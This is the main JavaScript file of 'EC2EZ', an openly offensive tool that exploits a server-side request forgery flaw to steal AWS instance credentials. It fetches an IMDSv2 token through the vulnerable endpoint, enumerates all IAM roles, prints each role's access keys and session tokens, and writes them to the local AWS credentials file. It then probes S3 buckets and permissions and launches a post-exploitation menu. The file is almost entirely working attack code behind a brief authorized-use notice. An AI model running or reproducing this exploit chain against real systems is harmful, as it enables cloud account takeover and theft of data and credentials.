import { CONFIG, COLORS } from "./src/config.js";
import {
  displayBanner,
  logInfo,
  logSuccess,
  logError,
  logSeparator,
  log,
  extractSSRFParam,
} from "./src/utils.js";
import {
  testSSRFVulnerability,
  fetchIMDSv2Token,
  fetchIAMRole,
  fetchAllIAMRoles,
  fetchCredentials,
  writeAWSCredentials,
} from "./src/imds.js";
import {
  enumerateRolePermissions,
  checkPassRolePolicy,
} from "./src/permissions.js";
import { runInteractiveMenu } from "./src/interactive.js";
import { validateCredentials } from "./src/aws.js";
import {
  discoverPresignedURLs,
  testPresignedURLs,
  displayMetadata,
} from "./src/presigned.js";
import {
  enumerateIMDSRecursive,
  testS3Access,
  testS3AccessWithCredentials,
  discoverBuckets,
  extractS3References,
} from "./src/s3discovery.js";
import { SessionSummary } from "./src/summary.js";

function displayHelp() {
  console.log(`
${COLORS.cyan}EC2EZ - AWS IMDSv2 Exploitation Tool${COLORS.reset}

${COLORS.bright}USAGE:${COLORS.reset}
  node ec2ez.js <ssrf-endpoint-url>

${COLORS.bright}ARGUMENTS:${COLORS.reset}
  ${COLORS.green}<ssrf-endpoint-url>${COLORS.reset}    Full URL of ANY endpoint vulnerable to SSRF
                         The endpoint should be able to forward requests
                         Can be /proxy, /fetch, /download, /api/load, etc.

${COLORS.bright}OPTIONS:${COLORS.reset}
  ${COLORS.green}-h, --help${COLORS.reset}           Show this help message and exit

${COLORS.bright}EXAMPLES:${COLORS.reset}
  ${COLORS.dim}# Example 1: Endpoint with 'url' parameter${COLORS.reset}
  node ec2ez.js http://vulnerable-site.com/proxy?url=

  ${COLORS.dim}# Example 2: Endpoint with 'target' parameter${COLORS.reset}
  node ec2ez.js http://api.example.com/fetch?target=

  ${COLORS.dim}# Example 3: Endpoint with 'endpoint' parameter${COLORS.reset}
  node ec2ez.js https://target.com/download?endpoint=

  ${COLORS.dim}# Example 4: No parameter (defaults to 'url')${COLORS.reset}
  node ec2ez.js http://site.com/proxy

  ${COLORS.green}✓${COLORS.reset} ${COLORS.dim}Tool auto-detects the parameter name from your URL!${COLORS.reset}
  ${COLORS.dim}  Just include the query parameter in the URL and it will be extracted${COLORS.reset}

${COLORS.bright}WHAT IT DOES:${COLORS.reset}
  1. Tests if the proxy is vulnerable to SSRF
  2. Extracts IMDSv2 token through the SSRF
  3. Enumerates ALL available IAM roles on the EC2 instance
  4. Extracts AWS credentials for each role
  5. Discovers IMDS metadata (tags, user-data, etc.)
  6. Tests which roles have S3 access
  7. Extracts bucket names from metadata
  8. Enumerates IAM permissions
  9. Provides interactive menu for post-exploitation
  10. Generates comprehensive summary report

${COLORS.bright}OUTPUT:${COLORS.reset}
  - Credentials saved to: ~/.aws/credentials
  - Summary displayed at end of execution
  - Pre-signed URL commands provided for S3 access

${COLORS.bright}SECURITY NOTICE:${COLORS.reset}
  ${COLORS.yellow}⚠  This tool is for authorized security testing ONLY${COLORS.reset}
  ${COLORS.yellow}⚠  Unauthorized access to computer systems is illegal${COLORS.reset}
  ${COLORS.yellow}⚠  Always obtain written permission before testing${COLORS.reset}

${COLORS.bright}MORE INFO:${COLORS.reset}
  GitHub: https://github.com/yourusername/ec2ez
  Docs:   README.md
`);
}

async function main() {
  const arg = process.argv[2];
  const summary = new SessionSummary();

  if (arg === "-h" || arg === "--help") {
    displayHelp();
    process.exit(0);
  }

  const proxyUrl = arg;

  displayBanner();

  if (!proxyUrl) {
    logError("Missing required argument: SSRF endpoint URL");
    console.log(
      `${COLORS.yellow}Usage: node ec2ez.js <ssrf-endpoint-url>${COLORS.reset}`
    );
    console.log(
      `${COLORS.dim}Example: node ec2ez.js http://vulnerable-site.com/proxy?url=${COLORS.reset}`
    );
    console.log(
      `${COLORS.dim}         node ec2ez.js http://api.example.com/fetch?target=${COLORS.reset}`
    );
    console.log(
      `${COLORS.dim}Run 'node ec2ez.js --help' for more information${COLORS.reset}\n`
    );
    process.exit(1);
  }

  // Auto-detect SSRF parameter from URL
  const ssrfParam = extractSSRFParam(proxyUrl);
  CONFIG.ssrf.paramName = ssrfParam;
  logSeparator();

  try {
    const isVulnerable = await testSSRFVulnerability(proxyUrl);

    if (!isVulnerable) {
      logError("\nSSRF vulnerability test failed. Cannot proceed.");
      logSeparator();
      process.exit(1);
    }

    logSeparator();

    logInfo(`Extracting IMDSv2 token via proxy: ${proxyUrl}`);

    const token = await fetchIMDSv2Token(proxyUrl);

    if (!token) {
      throw new Error("No token received from IMDSv2");
    }

    logSuccess("✓ IMDSv2 token obtained");
    log(`Token: ${token}`, null, "green");

    summary.findings.imds.token = token;
    logSeparator();

    logInfo(
      `Enumerating ALL IAM roles from ${CONFIG.imdsv2.endpoints.iamMetadata}`
    );

    const iamRoles = await fetchAllIAMRoles(proxyUrl, token);

    logSuccess(`Found ${iamRoles.length} IAM role(s):`);
    iamRoles.forEach(role => log(`  - ${role}`, null, "cyan"));
    logSeparator();

    logInfo(`Extracting credentials for all ${iamRoles.length} role(s)...`);
    logSeparator();

    let primaryRole = null;
    let primaryCredentials = null;

    for (const iamRole of iamRoles) {
      try {
        logInfo(`Fetching credentials for: ${iamRole}`);
        const credentials = await fetchCredentials(proxyUrl, token, iamRole);

        log("SUCCESSFULLY RETRIEVED CREDENTIALS:", null, "red");
        log(`  Role: ${iamRole}`, null, "cyan");
        log(`  Access Key ID: ${credentials.AccessKeyId}`, null, "green");
        log(`  Secret Access Key: ${credentials.SecretAccessKey}`, null, "green");
        log(`  Session Token: ${credentials.Token}`, null, "green");

        let hoursUntilExpiration = null;
        if (credentials.Expiration) {
          const expirationDate = new Date(credentials.Expiration);
          const now = new Date();
          hoursUntilExpiration = (expirationDate - now) / (1000 * 60 * 60);

          log(`  Expiration: ${credentials.Expiration}`, null, "yellow");
          if (hoursUntilExpiration > 0) {
            log(`  Time until expiration: ${hoursUntilExpiration.toFixed(2)} hours`, null, "yellow");
          } else {
            log(`  WARNING: Credentials already expired!`, null, "red");
          }
        }

        summary.addRole({
          name: iamRole,
          credentials: credentials,
          expiresIn: hoursUntilExpiration,
          s3Access: false, // Will be tested later
          bucketsFound: 0,
        });

        if (!primaryRole) {
          primaryRole = iamRole;
          primaryCredentials = credentials;

          summary.setCredentials({
            extracted: true,
            roleName: iamRole,
            expiresIn: hoursUntilExpiration,
          });
        }

        logSeparator();
      } catch (error) {
        logError(`Failed to extract credentials for ${iamRole}: ${error.message}`);
        logSeparator();
      }
    }

    if (!primaryRole || !primaryCredentials) {
      throw new Error("Failed to extract credentials for any role");
    }

    const iamRole = primaryRole;
    const credentials = primaryCredentials;

    logInfo("Performing comprehensive IMDS enumeration...");

    const allMetadata = await enumerateIMDSRecursive(proxyUrl, token);

    const { urls: presignedURLs, metadata } = await discoverPresignedURLs(proxyUrl, token);
    Object.assign(allMetadata, metadata);

    let discoveredBucketNames = [];

    if (Object.keys(allMetadata).length > 0) {
      logInfo(`Discovered ${Object.keys(allMetadata).length} IMDS metadata entries`);

      const s3Refs = extractS3References(allMetadata);

      if (s3Refs.bucketNames.length > 0) {
        logSuccess(`Found ${s3Refs.bucketNames.length} potential S3 bucket reference(s) in metadata:`);
        s3Refs.bucketNames.forEach(bucket => log(`  - ${bucket}`, null, "cyan"));
        discoveredBucketNames = s3Refs.bucketNames;
      }

      if (s3Refs.urls.length > 0) {
        logSuccess(`Found ${s3Refs.urls.length} S3 URL(s) in metadata:`);
        s3Refs.urls.forEach(url => log(`  - ${url}`, null, "cyan"));
      }

      logSeparator();

      if (presignedURLs.length > 0) {
        const workingURLs = await testPresignedURLs(presignedURLs);

        if (workingURLs.length > 0) {
          logSuccess("Pre-signed URL access is available!");
          workingURLs.forEach(url => summary.addS3Finding("presignedUrl", url));
          logSeparator();
        }
      }

      const interestingPaths = Object.keys(allMetadata).filter(path =>
        path.includes("tags") || path.includes("user-data") ||
        path.includes("iam") || path.includes("identity")
      );

      summary.setIMDS({
        totalMetadata: Object.keys(allMetadata).length,
        interestingPaths: interestingPaths,
      });

      if (interestingPaths.length > 0) {
        logInfo("Interesting IMDS metadata:");
        for (const path of interestingPaths.slice(0, 10)) {
          log(`${path}:`, null, "cyan");
          console.log(`  ${allMetadata[path]}`);
        }
        logSeparator();
      }
    }

    logInfo("Writing AWS CLI credentials to ~/.aws/credentials...");

    writeAWSCredentials(
      credentials.AccessKeyId,
      credentials.SecretAccessKey,
      credentials.Token,
      CONFIG.aws.defaultRegion
    );

    logSeparator();

    const validationResult = await validateCredentials();

    summary.setCredentials({
      valid: validationResult.valid,
      region: validationResult.region,
      accountId: validationResult.accountId,
    });

    if (!validationResult.valid) {
      logError("Credentials are invalid in all tested regions.");
      logInfo("This might be a CTF scenario where credentials are intentionally restricted.");
      logInfo("Attempting to continue with permission discovery anyway...");
      logSeparator();
    }

    logInfo("Enumerating role permissions...");
    const permissionResults = await enumerateRolePermissions(iamRole);

    if (permissionResults) {
      summary.setPermissions({
        total: permissionResults.totalPermissions,
        discovered: permissionResults.allPermissions || [],
        dangerous: permissionResults.dangerousPermissionsList || [],
      });
    }

    await checkPassRolePolicy(iamRole);

    logInfo("Testing S3 access for all discovered roles...");
    logSeparator();

    for (let i = 0; i < summary.findings.roles.length; i++) {
      const roleData = summary.findings.roles[i];

      try {
        logInfo(`Testing role: ${roleData.name}`);
        const s3Results = await testS3AccessWithCredentials(
          roleData.name,
          roleData.credentials.AccessKeyId,
          roleData.credentials.SecretAccessKey,
          roleData.credentials.Token
        );

        if (s3Results.listBuckets && s3Results.buckets.length > 0) {
          summary.findings.roles[i].s3Access = true;
          summary.findings.roles[i].bucketsFound = s3Results.buckets.length;

          logSuccess(`✓ Role ${roleData.name} has S3 access! Found ${s3Results.buckets.length} bucket(s)`);

          s3Results.buckets.forEach(bucket => {
            summary.addS3Finding("bucket", bucket.name);
            bucket.objects.forEach(obj => {
              summary.addS3Finding("object", { bucket: bucket.name, key: obj.Key });
            });
          });
        } else {
          logInfo(`✗ Role ${roleData.name} has no S3 access`);
        }

        logSeparator();
      } catch (error) {
        logError(`Error testing S3 for role ${roleData.name}: ${error.message}`);
        logSeparator();
      }
    }

    const s3Results = await testS3Access();

    if (discoveredBucketNames.length > 0) {
      logSeparator();
      logInfo("Testing discovered bucket names from IMDS with all roles...");

      for (const bucketName of discoveredBucketNames) {
        logInfo(`Testing bucket: ${bucketName}`);

        for (const roleData of summary.findings.roles) {
          try {
            logInfo(`  Trying with role: ${roleData.name}`);

            process.env.AWS_ACCESS_KEY_ID = roleData.credentials.AccessKeyId;
            process.env.AWS_SECRET_ACCESS_KEY = roleData.credentials.SecretAccessKey;
            process.env.AWS_SESSION_TOKEN = roleData.credentials.Token;

            const { executeAWSCommand } = await import("./src/aws.js");
            const output = await executeAWSCommand(`aws s3 ls s3://${bucketName}/ --region us-east-1`);

            if (output && output.trim().length > 0) {
              logSuccess(`  ✓ SUCCESS! Role ${roleData.name} can access bucket ${bucketName}!`);
              log(`  Objects:`, null, "green");
              console.log(output);

              summary.addS3Finding("bucket", bucketName);
              break; // Found working role, move to next bucket
            }
          } catch (error) {
            log(`  ✗ No access with role ${roleData.name}`, null, "dim");
          }
        }

        logSeparator();
      }
    }

    logInfo("Launching interactive menu...");

    await runInteractiveMenu(permissionResults);

    summary.display();

  } catch (error) {
    logError("Fatal error occurred");
    log(error.message, null, "red");

    if (summary.findings.credentials.extracted ||
        summary.findings.imds.totalMetadata > 0 ||
        summary.findings.s3.accessibleBuckets.length > 0) {
      summary.display();
    } else {
      logError("\nFailed to connect to proxy or extract credentials.");
      logInfo("Please verify:");
      logInfo("  1. The proxy URL is correct and accessible");
      logInfo("  2. The SSRF vulnerability is still active");
      logInfo("  3. The target EC2 instance has IMDSv2 enabled");
      logSeparator();
    }

    process.exit(1);
  }
}

main();
